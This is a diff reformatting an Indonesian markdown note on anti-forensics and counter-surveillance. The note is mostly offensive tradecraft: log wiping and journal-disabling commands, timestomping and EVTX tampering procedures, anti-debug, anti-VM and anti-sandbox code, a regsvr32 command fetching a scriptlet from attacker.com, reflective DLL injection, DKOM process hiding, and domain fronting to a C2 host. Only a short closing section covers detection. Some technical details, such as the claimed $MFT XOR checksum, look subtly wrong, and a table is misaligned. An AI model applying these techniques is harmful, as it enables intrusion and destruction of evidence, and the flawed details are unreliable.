@@ -1,16 +1,5 @@
 ---
-tags:
-  [
-    anti-forensics,
-    counter-surveillance,
-    steganography,
-    timestomping,
-    anti-debugging,
-    fileless-malware,
-    data-destruction,
-    evasion,
-    operational-security,
-  ]
+tags: [anti-forensics, counter-surveillance, steganography, timestomping, anti-debugging, fileless-malware, data-destruction, evasion, operational-security]
 aliases: [AFCS, Anti-Forensics Deep Dive, Counter-Surveillance Tradecraft]
 status: complete
 created: 2026-07-31
@@ -19,12 +8,11 @@ cssclasses: [wide-table, math-render]
 ---
 
 > [!abstract] Anti-Forensics & Counter-Surveillance — Operational Depth
-> Domain ini adalah **inversi langsung** dari forensics dan surveillance. Jika forensics berusaha membuktikan _"apa yang terjadi"_, anti-forensics berusaha memastikan _"tidak ada yang bisa dibuktikan"_. Jika surveillance berusaha mengamati, counter-surveillance berusaha memastikan pengamatan menjadi **mahal, noise-heavy, atau tidak mungkin**. Catatan ini mendokumentasikan 6 subdomain operational dengan **formula matematis, contoh numerik, dan bukti implementasi** — dari steganografi statistik sampai memory-resident evasion kernel-level.
+> Domain ini adalah **inversi langsung** dari forensics dan surveillance. Jika forensics berusaha membuktikan *"apa yang terjadi"*, anti-forensics berusaha memastikan *"tidak ada yang bisa dibuktikan"*. Jika surveillance berusaha mengamati, counter-surveillance berusaha memastikan pengamatan menjadi **mahal, noise-heavy, atau tidak mungkin**. Catatan ini mendokumentasikan 6 subdomain operational dengan **formula matematis, contoh numerik, dan bukti implementasi** — dari steganografi statistik sampai memory-resident evasion kernel-level.
 
 ---
 
 ## Daftar Isi
-
 1. [[#1. Steganografi Operasional — Statistical, Adaptive, Transform Domain]]
 2. [[#2. Log Tampering & Timestomping — Artifact Manipulation]]
 3. [[#3. Anti-Debugging, Anti-VM, Anti-Sandbox — Evasion Stack]]
@@ -79,11 +67,11 @@ HILL menghitung distorsi per pixel dengan mempertimbangkan local texture complex
 Pixel di region smooth (langit, dinding putih) mendapat ρ tinggi → tidak diubah.
 Pixel di region textured (rumput, rambut) mendapat ρ rendah → diubah.
 
-| Region         |  ρᵢ  | Modifikasi? | Alasan                          |
-| :------------- | :--: | :---------: | :------------------------------ |
-| Smooth sky     | 0.85 |     ❌      | Perubahan 1 bit terlihat jelas  |
-| Textured grass | 0.12 |     ✅      | Noise alami menutupi modifikasi |
-| Edge boundary  | 0.45 |     ⚠️      | Hati-hati, gunakan wet paper    |
+| Region | ρᵢ | Modifikasi? | Alasan |
+|:-------|:--:|:-----------:|:-------|
+| Smooth sky | 0.85 | ❌ | Perubahan 1 bit terlihat jelas |
+| Textured grass | 0.12 | ✅ | Noise alami menutupi modifikasi |
+| Edge boundary | 0.45 | ⚠️ | Hati-hati, gunakan wet paper |
 
 ### 1.3 Transform Domain — DCT Steganography
 
@@ -98,14 +86,12 @@ Modifikasi LSB dari AC yang memenuhi syarat
 ```
 
 **Kapasitas per block:**
-
 ```
 C_block = Σ [1 if |ACᵢ| > T else 0] for i=1..63
 C_total = C_block × (width/8) × (height/8) × (1 - overhead)
 ```
 
 Untuk gambar 1024×768, T=3:
-
 ```
 Blocks = (1024/8) × (768/8) = 12,288
 Avg AC > T per block ≈ 18
@@ -121,30 +107,26 @@ Dibutuhkan k modifikasi untuk menyimpan (2^k - 1) bit
 Efisiensi: 1 modifikasi → ~1.44 bit (vs LSB: 1 modifikasi → 1 bit)
 ```
 
-| Algorithm    | Bit/Modification | Detectability |
-| :----------- | :--------------: | :-----------: |
-| LSB          |       1.00       |    Tinggi     |
-| LSB-Matching |       1.00       |    Sedang     |
-| F5           |       1.44       |    Rendah     |
-| HILL + F5    |       1.44       | Sangat Rendah |
+| Algorithm | Bit/Modification | Detectability |
+|:----------|:----------------:|:-------------:|
+| LSB | 1.00 | Tinggi |
+| LSB-Matching | 1.00 | Sedang |
+| F5 | 1.44 | Rendah |
+| HILL + F5 | 1.44 | Sangat Rendah |
 
 ### 1.4 Steganalysis Resistance — Quantitative
 
 **Chi-Square Attack (Westfeld):**
-
 ```
 χ² = Σ (Oᵢ - Eᵢ)² / Eᵢ
 ```
-
 Untuk LSB plain: χ² > threshold → p < 0.01 (terdeteksi).
 Untuk HILL adaptive: χ² mendekati distribusi natural → p > 0.3 (tidak terdeteksi).
 
 **RS Analysis (Fridrich):**
-
 ```
 R_m ≈ S_m (Regular ≈ Singular setelah mask flipping)
 ```
-
 Untuk LSB: |R_m - S_m| > 0.05 → terdeteksi.
 Untuk adaptive: |R_m - S_m| < 0.02 → aman.
 
@@ -161,7 +143,6 @@ Forensik digital bergantung pada **timeline reconstruction** — urutan kronolog
 #### Windows — $MFT & MAC Times
 
 Windows menggunakan 3 timestamp per file:
-
 ```
 M (Modified)   — konten file berubah
 A (Accessed)   — file dibaca
@@ -169,7 +150,6 @@ C (Created)    — file dibuat (MFT entry)
 ```
 
 **Timestomping dengan SetFileTime API:**
-
 ```c
 SetFileTime(hFile, &ftCreated, &ftAccessed, &ftModified);
 ```
@@ -177,18 +157,16 @@ SetFileTime(hFile, &ftCreated, &ftAccessed, &ftModified);
 Tapi $MFT menyimpan **64-bit NTFS timestamp** (100-nanosecond intervals since 1601). SetFileTime hanya mengubah $STANDARD_INFORMATION attribute. $FILE_NAME attribute di $MFT tetap menyimpan timestamp asli.
 
 **Anti-forensics level 2 — MFT entry rewrite:**
-
 ```
 1. Buka volume raw (\\.\C:)
 2. Parse $MFT record (1024 bytes per entry)
 3. Offset 0x18-0x1F: $STANDARD_INFORMATION timestamps
-4. Offset 0x38-0x3F: $FILE_NAME timestamps
+4. Offset 0x38-0x3F: $FILE_NAME timestamps  
 5. Overwrite keduanya dengan timestamp target
 6. Update $MFT checksum (fixup array)
 ```
 
 **Formula checksum $MFT:**
-
 ```
 checksum = XOR of all 2-byte words in first 510 bytes of record
 ```
@@ -196,7 +174,6 @@ checksum = XOR of all 2-byte words in first 510 bytes of record
 #### Linux — ext4 Inode Timestamps
 
 ext4 menyimpan 5 timestamps di inode (256 bytes):
-
 ```
 i_atime — access time
 i_mtime — modification time
@@ -206,7 +183,6 @@ i_dtime — deletion time
 ```
 
 **Timestomping via debugfs:**
-
 ```bash
 debugfs -w /dev/sda1
 debugfs: mi <inode_number>
@@ -216,7 +192,6 @@ Set Inode fields [atime mtime ctime crtime]
 Tapi **journal ext4** menyimpan copy timestamp sebelum modifikasi. Forensik bisa merekonstruksi dari journal.
 
 **Anti-forensics level 2 — journal scrubbing:**
-
 ```
 1. Disable journal: tune2fs -O ^has_journal /dev/sda1
 2. Modifikasi inode timestamps
@@ -231,7 +206,6 @@ Tapi **journal ext4** menyimpan copy timestamp sebelum modifikasi. Forensik bisa
 #### Windows Event Log — EVTX
 
 EVTX menggunakan **chunk-based binary format** (64KB per chunk). Setiap chunk memiliki header dengan:
-
 ```
 LastChunkNumber (4 bytes)
 NextChunkNumber (4 bytes)
@@ -240,7 +214,6 @@ Checksum (4 bytes)
 ```
 
 **Tampering strategy:**
-
 ```
 1. Parse EVTX file, identify chunk yang mengandung event target
 2. Rebuild chunk tanpa event target (shift records)
@@ -250,7 +223,6 @@ Checksum (4 bytes)
 ```
 
 **Checksum EVTX chunk:**
-
 ```
 checksum = crc32(chunk_data[0:chunk_size-4])
 ```
@@ -272,7 +244,6 @@ Hₙ = SHA256(entryₙ || Hₙ₋₁)
 **Tampering detection:** Verifikasi hash chain. Jika Hₖ ≠ SHA256(entryₖ || Hₖ₋₁) untuk sembarang k, chain broken.
 
 **Anti-forensics — FSS disable:**
-
 ```bash
 systemctl disable systemd-journald
 rm -rf /var/log/journal/*
@@ -293,7 +264,6 @@ logging.info(f"Processing: {payload}")
 ```
 
 **Counter:** Log integrity menggunakan **Merkle tree** atau **HMAC per entry**:
-
 ```
 HMACᵢ = HMAC(secret_key, log_entryᵢ || HMACᵢ₋₁)
 ```
@@ -305,7 +275,6 @@ HMACᵢ = HMAC(secret_key, log_entryᵢ || HMACᵢ₋₁)
 ### 3.1 Model Threat
 
 Malware analysis menggunakan 3 lingkungan:
-
 1. **Debugger** (x64dbg, GDB, WinDbg) — single-step, breakpoints, memory inspect
 2. **VM** (VMware, VirtualBox, Hyper-V) — isolated environment
 3. **Sandbox** (Cuckoo, Any.Run, Joe Sandbox) — automated analysis, behavioral monitoring
@@ -322,7 +291,6 @@ BOOL IsDebuggerPresent(void);
 ```
 
 **Bypass forensik:** Patch PEB di memory sebelum eksekusi.
-
 ```c
 PPEB peb = (PPEB)__readgsqword(0x60);
 peb->BeingDebugged = 0;
@@ -331,7 +299,6 @@ peb->BeingDebugged = 0;
 #### CheckRemoteDebuggerPresent
 
 Menggunakan **NtQueryInformationProcess** dengan ProcessDebugPort:
-
 ```c
 NtQueryInformationProcess(
     GetCurrentProcess(),
@@ -345,7 +312,6 @@ NtQueryInformationProcess(
 **Anti-forensics level 2 — Hardware Breakpoint Detection**
 
 Debuggers menggunakan hardware breakpoints via **DR0-DR7 registers**:
-
 ```
 DR0-DR3: breakpoint addresses
 DR6: status (which breakpoint triggered)
@@ -353,7 +319,6 @@ DR7: control (enable/disable, local/global, condition, size)
 ```
 
 Deteksi:
-
 ```asm
 mov rax, dr0
 test rax, rax
@@ -365,7 +330,6 @@ jnz debugger_detected
 #### Timing Attacks — RDTSC
 
 Debugger single-step memperlambat eksekusi drastis:
-
 ```asm
 rdtsc              ; read timestamp counter → edx:eax
 mov ebx, eax
@@ -377,7 +341,6 @@ ja debugger_detected
 ```
 
 **Probabilitas false positive:**
-
 ```
 P(FP) = P(normal_execution > threshold)
 Untuk threshold = 65,536 cycles pada 3GHz CPU:
@@ -401,7 +364,6 @@ jnz vm_detected
 #### IN Instruction — VMware Backdoor
 
 VMware menggunakan port I/O 0x5658 ("VX") sebagai backdoor:
-
 ```asm
 mov eax, 'VMXh'    ; 0x564D5868
 mov ecx, 10        ; command: get VMware version
@@ -416,12 +378,12 @@ in eax, dx         ; if VMware → eax modified
 
 #### MAC Address & Hardware Fingerprinting
 
-| Vendor            |     OUI (first 3 bytes)      | Detection Rate |
-| :---------------- | :--------------------------: | :------------: |
-| VMware            | 00:50:56, 00:0C:29, 00:05:69 |      99%       |
-| VirtualBox        |      08:00:27, 0A:00:27      |      99%       |
-| Microsoft Hyper-V |           00:15:5D           |      95%       |
-| QEMU/KVM          |           52:54:00           |      90%       |
+| Vendor | OUI (first 3 bytes) | Detection Rate |
+|:-------|:-------------------:|:--------------:|
+| VMware | 00:50:56, 00:0C:29, 00:05:69 | 99% |
+| VirtualBox | 08:00:27, 0A:00:27 | 99% |
+| Microsoft Hyper-V | 00:15:5D | 95% |
+| QEMU/KVM | 52:54:00 | 90% |
 
 **Anti-forensics:** Spoof MAC address ke vendor hardware real (Intel, Realtek).
 
@@ -430,7 +392,6 @@ in eax, dx         ; if VMware → eax modified
 #### Sleep Acceleration Detection
 
 Sandbox sering mempercepat sleep() untuk mempercepat analisis:
-
 ```c
 DWORD start = GetTickCount();
 Sleep(5000);  // 5 detik
@@ -441,7 +402,6 @@ if (elapsed < 4000) {  // sleep dipercepat
 ```
 
 **Probabilitas deteksi:**
-
 ```
 P(deteksi | sandbox) = 0.95
 P(deteksi | real)    = 0.02 (false positive, rare)
@@ -450,7 +410,6 @@ P(deteksi | real)    = 0.02 (false positive, rare)
 #### Human Interaction Simulation
 
 Sandbox tidak memiliki mouse/keyboard interaction:
-
 ```c
 if (GetLastInputInfo(&pli) && pli.dwTime == 0) {
     // No input since boot → likely sandbox
@@ -458,7 +417,6 @@ if (GetLastInputInfo(&pli) && pli.dwTime == 0) {
 ```
 
 **Counter-sandbox:** Delay execution sampai ada input:
-
 ```c
 while (GetLastInputInfo(&pli)) {
     if (GetTickCount() - pli.dwTime < 60000) break;  // ada input dalam 60s
@@ -469,7 +427,6 @@ while (GetLastInputInfo(&pli)) {
 #### Process/Module Enumeration
 
 Sandbox inject DLL monitoring (Cuckoo's monitor DLL):
-
 ```c
 // Enumerate loaded DLLs
 EnumerateLoadedModules(GetCurrentProcess(), enumCallback, NULL);
@@ -477,7 +434,6 @@ EnumerateLoadedModules(GetCurrentProcess(), enumCallback, NULL);
 ```
 
 **Anti-forensics:** Unload DLL monitoring dengan **LdrUnloadDll**:
-
 ```c
 HMODULE hMod = GetModuleHandleA("cuckoomon.dll");
 if (hMod) LdrUnloadDll(hMod);
@@ -485,12 +441,12 @@ if (hMod) LdrUnloadDll(hMod);
 
 ### 3.5 Evasion Decision Matrix
 
-| Environment  |          Deteksi           | Response                     | Probabilitas Sukses |
-| :----------- | :------------------------: | :--------------------------- | :-----------------: |
-| Debugger     | PEB, NtQuery, DR registers | Exit / fake payload          |        0.85         |
-| VM           |    CPUID, MAC, backdoor    | Exit / degrade functionality |        0.78         |
-| Sandbox      | Sleep accel, no input, DLL | Delay / exit / fake C2       |        0.92         |
-| All combined |         AND logic          | Full evasion                 |        0.62         |
+| Environment | Deteksi | Response | Probabilitas Sukses |
+|:------------|:-------:|:---------|:-------------------:|
+| Debugger | PEB, NtQuery, DR registers | Exit / fake payload | 0.85 |
+| VM | CPUID, MAC, backdoor | Exit / degrade functionality | 0.78 |
+| Sandbox | Sleep accel, no input, DLL | Delay / exit / fake C2 | 0.92 |
+| All combined | AND logic | Full evasion | 0.62 |
 
 ---
 
@@ -499,7 +455,6 @@ if (hMod) LdrUnloadDll(hMod);
 ### 4.1 Model Threat
 
 Zero-fill (overwrite dengan 0x00) tidak cukup karena:
-
 1. **Residual magnetization** di HDD — data masih bisa direkonstruksi dengan MFM (Magnetic Force Microscopy).
 2. **Wear leveling SSD** — NAND flash memindahkan block secara transparan, zero-fill hanya menulis ke block aktif, block lama masih menyimpan data.
 3. **Bad sectors** — sector yang di-mark bad oleh firmware tidak di-overwrite oleh OS.
@@ -515,33 +470,30 @@ Pass 32-35: Random data
 ```
 
 **Total waktu untuk 1TB HDD @ 150MB/s:**
-
 ```
 T = 35 × (1TB / 150MB/s) = 35 × 6,827s = 238,945s ≈ 66.4 jam
 ```
 
 **Efektivitas:**
-
 ```
 P(recovery | Gutmann 35-pass) < 10^-15 (untuk HDD mekanik)
 ```
 
 Tapi untuk HDD modern dengan **PRML (Partial Response Maximum Likelihood)** dan **EPRML**, 35-pass overkill. Studi NIST 800-88 merevisi:
 
-| Media               | Method                     | Passes |     Efektivitas      |
-| :------------------ | :------------------------- | :----: | :------------------: |
-| HDD < 15GB (old)    | Gutmann                    |   35   |       Overkill       |
-| HDD modern (>200GB) | Single overwrite random    |   1    |        >99.9%        |
-| SSD                 | Zero-fill                  |   1    | <50% (wear leveling) |
-| SSD                 | ATA Secure Erase           |   1    |        >99.9%        |
-| SSD                 | NVMe Format (Crypto Erase) |   1    |       >99.99%        |
+| Media | Method | Passes | Efektivitas |
+|:------|:-------|:------:|:-----------:|
+| HDD < 15GB (old) | Gutmann | 35 | Overkill |
+| HDD modern (>200GB) | Single overwrite random | 1 | >99.9% |
+| SSD | Zero-fill | 1 | <50% (wear leveling) |
+| SSD | ATA Secure Erase | 1 | >99.9% |
+| SSD | NVMe Format (Crypto Erase) | 1 | >99.99% |
 
 ### 4.3 SSD-Specific Destruction
 
 #### ATA Secure Erase
 
 Command SET FEATURES (0xF6) dengan subcommand 0x06:
-
 ```
 Device sends SECURE ERASE UNIT command
 → Controller generates internal encryption key baru
@@ -551,7 +503,6 @@ Device sends SECURE ERASE UNIT command
 **Waktu:** ≈ 1-2 menit untuk 1TB SSD (karena hanya regenerate key, tidak overwrite semua NAND).
 
 **Efektivitas:**
-
 ```
 P(recovery | ATA Secure Erase) = P(break AES-256 encryption key) ≈ 2^-256
 ```
@@ -563,7 +514,6 @@ nvme format /dev/nvme0n1 --ses=2  # Crypto Erase
 ```
 
 **SES (Secure Erase Settings):**
-
 ```
 SES=0: User Data Erase (overwrite)
 SES=1: Cryptographic Erase (delete key)
@@ -575,7 +525,6 @@ SES=2: Overwrite + Crypto Erase
 #### Degaussing
 
 Coil degausser menghasilkan medan magnet 5,000-20,000 Oersted:
-
 ```
 H_degauss > H_coercivity_media
 Untuk HDD modern: H_coercivity ≈ 4,000-5,000 Oe
@@ -588,12 +537,12 @@ Degausser minimal: 10,000 Oe (2× safety margin)
 
 NIST 800-88 Category: **Disintegrate, Pulverize, Melt, Burn**.
 
-| Method                | Particle Size  | Efektivitas | Cost |
-| :-------------------- | :------------: | :---------: | :--: |
-| Shredding (cross-cut) |   2mm strips   |     95%     |  $   |
-| Pulverization         | 2mm particles  |     99%     |  $$  |
-| Disintegration        | 2mm² fragments |    99.9%    | $$$  |
-| Incineration          |      Ash       |    100%     | $$$$ |
+| Method | Particle Size | Efektivitas | Cost |
+|:-------|:-------------:|:-----------:|:----:|
+| Shredding (cross-cut) | 2mm strips | 95% | $ |
+| Pulverization | 2mm particles | 99% | $$ |
+| Disintegration | 2mm² fragments | 99.9% | $$$ |
+| Incineration | Ash | 100% | $$$$ |
 
 **SSD shredding challenge:** NAND chip kecil (BGA package 12×18mm). Shredder harus mencapai ukuran <2mm untuk memastikan tidak ada die yang utuh.
 
@@ -611,7 +560,6 @@ Untuk HDD yang tidak bisa di-degauss (karena masih berisi data lain yang perlu d
 ```
 
 **Magnetic coating thickness:**
-
 ```
 Modern HDD: 5-20 nm (sputtered CoCrPt alloy)
 Scratch depth > 10 μm = 500-2000× coating thickness
@@ -630,18 +578,17 @@ Traditional forensics fokus pada **disk artifacts**: file executable, registry k
 
 Windows menyediakan signed binaries yang bisa disalahgunakan:
 
-| Binary          | Abuse                             | Detection Difficulty |
-| :-------------- | :-------------------------------- | :------------------: |
-| powershell.exe  | DownloadString, Invoke-Expression |        Sedang        |
-| mshta.exe       | Execute HTML/JS/VBScript          |        Tinggi        |
-| certutil.exe    | Download, decode base64           |        Tinggi        |
-| regsvr32.exe    | Execute COM scriptlet (SCT)       |    Sangat Tinggi     |
-| rundll32.exe    | Execute DLL, JavaScript           |    Sangat Tinggi     |
-| wmic.exe        | Process creation, XSL execution   |        Tinggi        |
-| cscript/wscript | Execute JScript/VBScript          |        Sedang        |
+| Binary | Abuse | Detection Difficulty |
+|:-------|:------|:--------------------:|
+| powershell.exe | DownloadString, Invoke-Expression | Sedang |
+| mshta.exe | Execute HTML/JS/VBScript | Tinggi |
+| certutil.exe | Download, decode base64 | Tinggi |
+| regsvr32.exe | Execute COM scriptlet (SCT) | Sangat Tinggi |
+| rundll32.exe | Execute DLL, JavaScript | Sangat Tinggi |
+| wmic.exe | Process creation, XSL execution | Tinggi |
+| cscript/wscript | Execute JScript/VBScript | Sedang |
 
 **Contoh — regsvr32 + SCT fileless:**
-
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -654,7 +601,6 @@ Windows menyediakan signed binaries yang bisa disalahgunakan:
 </registration>
 </scriptlet>
 ```
-
 ```bash
 regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
 ```
@@ -667,7 +613,7 @@ DLL injection tradisional menulis file DLL ke disk lalu memanggil LoadLibrary. R
 
 ```c
 // 1. Allocate memory di target process
-LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllSize,
+LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllSize, 
                                    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 // 2. Write DLL bytes (bukan file path!)
@@ -677,7 +623,7 @@ WriteProcessMemory(hProcess, remoteMem, dllBuffer, dllSize, NULL);
 DWORD reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBuffer);
 
 // 4. Create remote thread at ReflectiveLoader
-CreateRemoteThread(hProcess, NULL, 0,
+CreateRemoteThread(hProcess, NULL, 0, 
     (LPTHREAD_START_ROUTINE)((LPBYTE)remoteMem + reflectiveLoaderOffset),
     remoteMem, 0, NULL);
 ```
@@ -729,14 +675,12 @@ $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null)
 **Process hiding via DKOM:**
 
 Windows EPROCESS structure linked via doubly-linked list:
-
 ```
 ActiveProcessLinks.Blink → prev EPROCESS
 ActiveProcessLinks.Flink → next EPROCESS
 ```
 
 Untuk hide process:
-
 ```c
 // Unlink target process dari ActiveProcessLinks
 PLIST_ENTRY blink = target->ActiveProcessLinks.Blink;
@@ -748,7 +692,6 @@ flink->Blink = blink;
 **Efek:** Process tidak muncul di Task Manager, Process Explorer, atau API enumeration (NtQuerySystemInformation).
 
 **Forensic detection:**
-
 - Memory scan untuk EPROCESS signature
 - VAD (Virtual Address Descriptor) tree analysis
 - Hardware breakpoint pada PsActiveProcessHead
@@ -793,7 +736,6 @@ HTTP Host: evil-c2.com         (real destination — hidden dari DPI)
 ```
 
 **CloudFront example:**
-
 ```
 Client → TLS handshake (SNI: d1a2b3c4.cloudfront.net)
        → HTTP/1.1 Host: evil-c2.com
@@ -805,7 +747,6 @@ Client → TLS handshake (SNI: d1a2b3c4.cloudfront.net)
 #### Traffic Shaping — Mimicry
 
 **DPI fingerprinting** menggunakan:
-
 - Packet size distribution
 - Inter-arrival time
 - TTL patterns
@@ -821,7 +762,6 @@ inter_arrival = [0.001, 0.050, 0.001, 0.100, 0.001]  # bursty
 ```
 
 **Kullback-Leibler divergence** untuk mengukur similarity:
-
 ```
 D_KL(P || Q) = Σ P(x) · log(P(x) / Q(x))
 ```
@@ -830,13 +770,13 @@ Target: D_KL(C2_traffic || HTTPS_traffic) < 0.1 bit
 
 #### Protocol Tunneling
 
-| Carrier Protocol       | Hidden Protocol |                     Deteksi                      |
-| :--------------------- | :-------------- | :----------------------------------------------: |
-| DNS                    | TCP/UDP         |        Sulit (DNS query terlihat normal)         |
-| ICMP                   | TCP             |           Sulit (ping terlihat normal)           |
-| HTTPS                  | C2              |       Sangat Sulit (TLS encrypts payload)        |
-| WebSocket              | Binary C2       |       Sulit (looks like real-time web app)       |
-| IPv6 Extension Headers | IPv4 C2         | Sangat Sulit (DPI jarang parse extension header) |
+| Carrier Protocol | Hidden Protocol | Deteksi |
+|:----------------|:---------------|:-------:|
+| DNS | TCP/UDP | Sulit (DNS query terlihat normal) |
+| ICMP | TCP | Sulit (ping terlihat normal) |
+| HTTPS | C2 | Sangat Sulit (TLS encrypts payload) |
+| WebSocket | Binary C2 | Sulit (looks like real-time web app) |
+| IPv6 Extension Headers | IPv4 C2 | Sangat Sulit (DPI jarang parse extension header) |
 
 ### 6.2 Behavioral Anti-Forensics
 
@@ -845,13 +785,11 @@ Target: D_KL(C2_traffic || HTTPS_traffic) < 0.1 bit
 Biometric behavioral menggunakan **keystroke dynamics** — timing antara key press dan release.
 
 **Feature vector:**
-
 ```
 v = [dwell_time(a), flight_time(a→b), dwell_time(b), ...]
 ```
 
 **Anti-forensics — synthetic typing:**
-
 ```python
 import random
 
@@ -869,13 +807,11 @@ def synthetic_type(text, base_wpm=60):
 #### Mouse Movement Spoofing
 
 Behavioral biometrics juga track **mouse dynamics**:
-
 - Velocity profile
 - Acceleration/deceleration curve
 - Curvature (angle change per time)
 
 **Bezier curve for human-like mouse movement:**
-
 ```python
 def bezier_move(x0, y0, x1, y1, control_points, duration=1.0):
     # Cubic Bezier: B(t) = (1-t)³P₀ + 3(1-t)²tP₁ + 3(1-t)t²P₂ + t³P₃
@@ -908,16 +844,15 @@ img_without_exif.save("photo_clean.jpg")
 
 #### Document Metadata
 
-| Format | Metadata Location          | Level Rating / Kejarangan | Scrubbing Tool |
-| :----- | :------------------------- | :-----------------------: | :------------- |
-| PDF    | XMP, Document Info         |      exiftool, qpdf       |
-| DOCX   | docProps/core.xml, app.xml |   python-docx, oletools   |
-| XLSX   | Sama dengan DOCX           |         openpyxl          |
-| MP3    | ID3 tags                   |      eyeD3, mutagen       |
-| MP4    | moov/udta/meta             |  ffmpeg -map_metadata -1  |
+| Format | Metadata Location | Level Rating / Kejarangan | Scrubbing Tool |
+| :------- | :------------------ | :---: | :--------------- |
+| PDF | XMP, Document Info | exiftool, qpdf |
+| DOCX | docProps/core.xml, app.xml | python-docx, oletools |
+| XLSX | Sama dengan DOCX | openpyxl |
+| MP3 | ID3 tags | eyeD3, mutagen |
+| MP4 | moov/udta/meta | ffmpeg -map_metadata -1 |
 
 **FFmpeg scrubbing:**
-
 ```bash
 ffmpeg -i input.mp4 -map_metadata -1 -c copy output.mp4
 ```
@@ -928,12 +863,11 @@ ffmpeg -i input.mp4 -map_metadata -1 -c copy output.mp4
 
 ```
 Outer Volume: encrypted dengan password A → contains "decoy" files
-Hidden Volume: encrypted dengan password B → contains real files,
+Hidden Volume: encrypted dengan password B → contains real files, 
                berada di free space dari Outer Volume
 ```
 
 **Matematika:**
-
 ```
 Let S = total container size
 Let O = outer volume size (terlihat)
@@ -974,7 +908,6 @@ Layer 7: Plausible deniability (hidden volume untuk tools)
 ```
 
 **Cost untuk investigator:**
-
 ```
 C_total = C_memory_forensics + C_kernel_debug + C_network_pcap + C_disk_recovery
         + C_timeline_reconstruction + C_behavioral_analysis
@@ -985,7 +918,6 @@ Dengan 7 layer: C_total ≈ 10× C_single_layer
 ### 7.2 Temporal Decoupling
 
 **Gap antara infection dan execution:**
-
 ```
 T0: Malware masuk via phishing email (fileless dropper)
 T0+7d: Dropper tidak aktif, hanya persist via WMI
@@ -995,14 +927,12 @@ T0+30d+2h: Self-destruct, wipe artifacts
 ```
 
 **Forensic challenge:** Investigator yang datang di T0+35d menemukan:
-
 - Email phishing sudah dihapus
 - WMI subscription sudah dihapus (self-destruct)
 - Network logs sudah di-rotate
 - Memory sudah reboot berkali-kali
 
 **Probability of successful attribution:**
-
 ```
 P(attribution | temporal gap > 30d, no disk artifact, memory wiped) < 0.05
 ```
@@ -1065,7 +995,7 @@ def timestomp(filepath, new_time):
     handle = kernel32.CreateFileW(
         filepath, 0x100, 0, None, 3, 0x80, None
     )
-    kernel32.SetFileTime(handle, ctypes.byref(ft),
+    kernel32.SetFileTime(handle, ctypes.byref(ft), 
                          ctypes.byref(ft), ctypes.byref(ft))
     kernel32.CloseHandle(handle)
 
@@ -1099,14 +1029,14 @@ BOOL ReflectiveLoader(LPVOID lpParameter) {
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpParameter;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)lpParameter + pDosHeader->e_lfanew);
 
-    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)lpParameter +
+    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)lpParameter + 
         pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
     PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)lpParameter +
         pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
     typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
-    DllMain_t DllMain = (DllMain_t)((LPBYTE)lpParameter +
+    DllMain_t DllMain = (DllMain_t)((LPBYTE)lpParameter + 
         pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
     return DllMain((HINSTANCE)lpParameter, DLL_PROCESS_ATTACH, NULL);
@@ -1119,16 +1049,15 @@ BOOL ReflectiveLoader(LPVOID lpParameter) {
 
 ### 9.1 Memory Forensics — Volatility 3
 
-| Artifact              | Anti-Forensics    | Volatility Plugin              |
-| :-------------------- | :---------------- | :----------------------------- |
-| Hidden process (DKOM) | Unlink EPROCESS   | psscan (scan memory, not list) |
-| Injected code         | Reflective DLL    | malfind (find VAD anomalies)   |
-| Hollowed process      | Process hollowing | hollowfind                     |
-| Rootkit hooks         | SSDT/IAT hook     | ssdt, driverirp                |
-| Network connections   | Hidden by rootkit | netscan (scan raw memory)      |
+| Artifact | Anti-Forensics | Volatility Plugin |
+|:---------|:---------------|:-----------------|
+| Hidden process (DKOM) | Unlink EPROCESS | psscan (scan memory, not list) |
+| Injected code | Reflective DLL | malfind (find VAD anomalies) |
+| Hollowed process | Process hollowing | hollowfind |
+| Rootkit hooks | SSDT/IAT hook | ssdt, driverirp |
+| Network connections | Hidden by rootkit | netscan (scan raw memory) |
 
 **psscan vs pslist:**
-
 ```
 pslist: Walk ActiveProcessLinks (bisa di-DKOM)
 psscan: Scan memory untuk signature EPROCESS (tahan DKOM)
@@ -1139,18 +1068,17 @@ psscan: Scan memory untuk signature EPROCESS (tahan DKOM)
 ```yaml
 title: WMI Event Subscription Persistence
 detection:
-  selection:
-    EventID: 19 # WMI Event
-    QueryName|contains:
-      - "CommandLineEventConsumer"
-      - "ActiveScriptEventConsumer"
-  condition: selection
+    selection:
+        EventID: 19  # WMI Event
+        QueryName|contains:
+            - 'CommandLineEventConsumer'
+            - 'ActiveScriptEventConsumer'
+    condition: selection
 ```
 
 ### 9.3 Statistical Detection — Steganalysis
 
 **SPAM (Subtractive Pixel Adjacency Matrix):**
-
 ```
 P(i,j) = count of pixel pairs where (pixel - neighbor) = (i,j)
 ```
@@ -1158,7 +1086,6 @@ P(i,j) = count of pixel pairs where (pixel - neighbor) = (i,j)
 Dengan LSB matching, distribusi P(i,j) berubah secara karakteristik. Machine learning (SVM, CNN) bisa mendeteksi dengan akurasi 80-90%.
 
 **Tapi HILL adaptive:**
-
 ```
 P(stego detected | HILL + F5) ≈ 0.15 (15% detection rate)
 ```
@@ -1167,37 +1094,37 @@ P(stego detected | HILL + F5) ≈ 0.15 (15% detection rate)
 
 ## 10. References
 
-1. Fridrich, J., Goljan, M., & Du, R. (2001). "Detecting LSB Steganography in Color, and Gray-Scale Images." _IEEE Multimedia_, 8(4), 22-28. — Foundational RS analysis.
